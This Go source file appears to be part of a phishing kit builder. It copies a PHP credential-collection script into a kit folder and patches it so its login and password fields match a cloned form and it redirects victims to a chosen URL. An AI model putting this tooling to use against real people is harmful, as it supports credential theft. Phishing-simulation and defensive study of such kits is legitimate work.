package main

import (
	"bytes"
	"html"
	"os"
	"path"
)

// copyPhpToKit (phpfilename string, destFolder string): copy PHP file in destFolder
func copyPhpToKit(phpfilename string, destFolder string) error {

	// check if PHP file exists
	phpfile, err := os.ReadFile(phpfilename)
	if err != nil {
		return err
	}

	// create file in dest folder
	err = os.WriteFile(path.Join(destFolder, phpfilename), phpfile, 0644)
	if err != nil {
		return err
	}
	return nil
}

// patchPhp (phppath string, postLogin string, postPassword string urlin string): patch PHP with url redirection and correct names of attributes for credentials
func patchPhp(phppath string, postLogin string, postPassword string, urlin string) error {

	// open new php file
	read, err := os.ReadFile(phppath)
	if err != nil {
		return err
	}
	newContents := []byte(read)

	// replace login and password with data collected from the form
	if postLogin != "login" {
		postLogin = html.EscapeString(postLogin)
		newContents = bytes.Replace(newContents, []byte("$parsed['login']"), []byte("$parsed['"+postLogin+"']"), -1)
	}

	if postPassword != "password" {
		postPassword = html.EscapeString(postPassword)
		newContents = bytes.Replace(newContents, []byte("$parsed['password']"), []byte("$parsed['"+postPassword+"']"), -1)
	}

	// replace landing page with destination URL
	newContents = bytes.Replace(newContents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"), -1)

	err = os.WriteFile(phppath, newContents, 0)
	if err != nil {
		return err
	}

	return nil
}
